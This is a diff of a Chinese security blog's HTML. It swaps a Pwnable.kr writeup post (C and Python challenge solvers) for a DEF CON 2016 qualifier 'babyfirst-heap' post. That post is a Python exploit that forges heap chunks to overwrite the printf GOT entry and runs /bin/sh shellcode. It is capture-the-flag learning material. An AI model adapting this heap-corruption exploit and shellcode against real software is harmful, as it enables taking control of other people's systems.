@@ -59,31 +59,16 @@
 
 
 
-<meta name="description" content="input这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等
-exp如下，需要注意
-
-因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了
-
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;u">
+<meta name="description" content="from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c&apos;io      = zio(target, print_read = c_read, print_write = c_wr">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwnable.kr writeups">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/19/pwnable/index.html">
+<meta property="og:title" content="def-con-qual-2016-babyfirst">
+<meta property="og:url" content="http://0byjwzsf.me/2016/07/21/def-con-qual-2016-babyfirst/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="input这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等
-exp如下，需要注意
-
-因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了
-
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;u">
-<meta property="og:updated_time" content="2016-07-19T13:54:08.000Z">
+<meta property="og:description" content="from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c&apos;io      = zio(target, print_read = c_read, print_write = c_wr">
+<meta property="og:updated_time" content="2016-07-21T02:11:26.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Pwnable.kr writeups">
-<meta name="twitter:description" content="input这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等
-exp如下，需要注意
-
-因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了
-
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;u">
+<meta name="twitter:title" content="def-con-qual-2016-babyfirst">
+<meta name="twitter:description" content="from zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c&apos;io      = zio(target, print_read = c_read, print_write = c_wr">
 
 
 
@@ -96,7 +81,7 @@ exp如下，需要注意
   };
 </script>
 
-  <title> Pwnable.kr writeups | Icemakr's Blog </title>
+  <title> def-con-qual-2016-babyfirst | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -291,7 +276,7 @@ exp如下，需要注意
             
             
               
-                Pwnable.kr writeups
+                def-con-qual-2016-babyfirst
               
             
           </h1>
@@ -300,8 +285,8 @@ exp如下，需要注意
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2016-07-19T21:54:08+08:00" content="2016-07-19">
-              2016-07-19
+            <time itemprop="dateCreated" datetime="2016-07-21T10:11:26+08:00" content="2016-07-21">
+              2016-07-21
             </time>
           </span>
 
@@ -311,8 +296,8 @@ exp如下，需要注意
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2016/07/19/pwnable/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/19/pwnable/" itemprop="commentsCount"></span>
+              <a href="/2016/07/21/def-con-qual-2016-babyfirst/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/def-con-qual-2016-babyfirst/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -331,20 +316,7 @@ exp如下，需要注意
       
 
       
-        <span itemprop="articleBody"><h2 id="input">input</h2><p>这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等</p>
-<p>exp如下，需要注意</p>
-<ul>
-<li>因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="comment">/* stage 1 */</span></span><br><span class="line">    <span class="keyword">int</span>     i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>     pid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>    *my_argv[<span class="number">101</span>]; </span><br><span class="line">    <span class="keyword">char</span>    *my_env[<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">int</span>     pipe_fd0[<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">int</span>     pipe_fd2[<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line">    setenv(<span class="string">"PATH"</span>, <span class="string">"/home/ctf"</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *path = (<span class="keyword">char</span> *)getenv(<span class="string">"PATH"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd0) &lt; <span class="number">0</span> || pipe(pipe_fd2) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pipe0 create error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">        my_argv[i] = <span class="string">"AAAA"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    my_argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>; </span><br><span class="line">    my_argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>; </span><br><span class="line">    my_argv[<span class="string">'C'</span>] = argv[<span class="number">1</span>]; </span><br><span class="line">    my_argv[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid == fork()) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        close(pipe_fd0[<span class="number">1</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        dup2(pipe_fd0[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">        dup2(pipe_fd2[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 3 */</span></span><br><span class="line">        my_env[<span class="number">0</span>] = <span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>;</span><br><span class="line">        my_env[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(<span class="string">"/home/ctf/pwn/input"</span>, my_argv, my_env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        <span class="comment">/* stage 2 */</span></span><br><span class="line">        close(pipe_fd0[<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        write(pipe_fd0[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">        write(pipe_fd2[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 4 */</span></span><br><span class="line">        FILE *fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 5 */</span></span><br><span class="line">        <span class="keyword">struct</span> sockaddr_in  serv;</span><br><span class="line">        <span class="keyword">int</span>                 sd;</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        bzero(&amp;serv, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">        serv.sin_family         = AF_INET;</span><br><span class="line">        serv.sin_port           = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">        serv.sin_addr.s_addr    = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">        sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        connect(sd, (<span class="keyword">const</span> <span class="keyword">struct</span> sockaddr *)&amp;serv, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line">        send(sd, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<h2 id="leg">leg</h2><ul>
-<li>在执行指令I时，pc寄存器存放I+2指令的地址</li>
-<li>lr寄存器存放返回地址，即BL指令的下一条指令的地址</li>
-</ul>
-<p>key1 = 0x8ce4<br>key2 = 0x8d0c<br>key3 = 0x8d80</p>
-<h2 id="mistake">mistake</h2><p>运行程序的时候发现需要输入两次，但是代码里只用到了一处scanf<br>找了会儿后发现原因是误用mode_t参数导致open总是返回0，导致read函数总是从标准输入读取字符串到pw_buf<br>输入0123456789 1032547698<br>即可拿到flag</p>
-<h2 id="coin1">coin1</h2><p>二分解决，exp如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9007</span>)</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout=<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'- Ready? starting in 3 sec... -'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_title</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'N='</span>)</span><br><span class="line">    num     = int(io.read_until(<span class="string">'C='</span>)[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">    chance  = int(io.read_until(<span class="string">'\n'</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (num,chance)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(frm, to)</span>:</span></span><br><span class="line">    num = to - frm + <span class="number">1</span></span><br><span class="line">    a = (num + <span class="number">1</span>)/<span class="number">2</span></span><br><span class="line">    payload1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, a-<span class="number">1</span>):</span><br><span class="line">        payload1 += (str(frm + i) + <span class="string">' '</span>)</span><br><span class="line">    payload1 += str(frm + a - <span class="number">1</span>)</span><br><span class="line">    io.writeline(payload1)</span><br><span class="line">    value1 = int(io.read_line())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> value1 &lt; a * <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(title)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    b = title[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a != b :</span><br><span class="line">        judge = test(a, b)</span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            a = (b - a + <span class="number">2</span>)/<span class="number">2</span> + a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = (b - a + <span class="number">2</span>)/<span class="number">2</span> + a - <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'a:'</span>+str(a)+<span class="string">' b:'</span>+str(b)</span><br><span class="line">    io.writeline(str(a))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    solve(read_title())</span><br><span class="line">    io.read_until(<span class="string">'Correct!'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
+        <span itemprop="articleBody"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'</span></span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048adb</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Exit function pointer"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">        io.read_line()</span><br><span class="line">    io.read_until(<span class="string">"loc="</span>)</span><br><span class="line">    loc = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    io.read_until(<span class="string">"size="</span>)</span><br><span class="line">    size = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (loc, size)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\xeb\x06\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">(loc, size) = pre()</span><br><span class="line"></span><br><span class="line">got_printf  = <span class="number">0x804c004</span></span><br><span class="line"></span><br><span class="line">fake0   =   <span class="string">'A'</span> * (size - <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">fake1   =   l32(size + <span class="number">0x4</span>) </span><br><span class="line">fake1   +=  l32((<span class="number">0x10</span>) | <span class="number">0x1</span>) </span><br><span class="line">fake1   =   fake1.ljust(<span class="number">0x10</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake2   =   l32(<span class="number">0x10</span>) </span><br><span class="line">fake2   +=  l32(<span class="number">0x80</span> | <span class="number">0x1</span>) </span><br><span class="line">fake2   +=  l32(got_printf - <span class="number">0x4</span> * <span class="number">2</span>)</span><br><span class="line">fake2   +=  l32(loc + size + <span class="number">0x10</span> + <span class="number">0xc</span>)</span><br><span class="line">fake2   +=  shellcode</span><br><span class="line">fake2   =   fake2.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake3   =   l32(<span class="number">0x80</span>)</span><br><span class="line">fake3   +=  l32(<span class="number">0x41</span> &amp; <span class="number">0xfffffff8</span>)</span><br><span class="line"></span><br><span class="line">fake    =   fake0 + fake1 + fake2 + fake3</span><br><span class="line"></span><br><span class="line">io.writeline(fake)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 </span>
       
     </div>
@@ -352,6 +324,20 @@ exp如下，需要注意
     <footer class="post-footer">
       
 
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/21/protostar/" rel="next" title="Protostar writeups">
+                <i class="fa fa-chevron-left"></i> Protostar writeups
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
       
 
       
@@ -423,7 +409,7 @@ exp如下，需要注意
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">1</span>
+              <span class="site-state-item-count">3</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -495,7 +481,7 @@ exp如下，需要注意
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#input"><span class="nav-number">1.</span> <span class="nav-text">input</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leg"><span class="nav-number">2.</span> <span class="nav-text">leg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mistake"><span class="nav-number">3.</span> <span class="nav-text">mistake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin1"><span class="nav-number">4.</span> <span class="nav-text">coin1</span></a></li></ol></div>
+              <p class="post-toc-empty">此文章未包含目录</p>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator">
@@ -759,9 +745,9 @@ exp如下，需要注意
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/19/pwnable/';
-      var disqus_title = 'Pwnable.kr writeups';
-      var disqus_url = 'http://0byjwzsf.me/2016/07/19/pwnable/';
+      var disqus_identifier = '2016/07/21/def-con-qual-2016-babyfirst/';
+      var disqus_title = 'def-con-qual-2016-babyfirst';
+      var disqus_url = 'http://0byjwzsf.me/2016/07/21/def-con-qual-2016-babyfirst/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
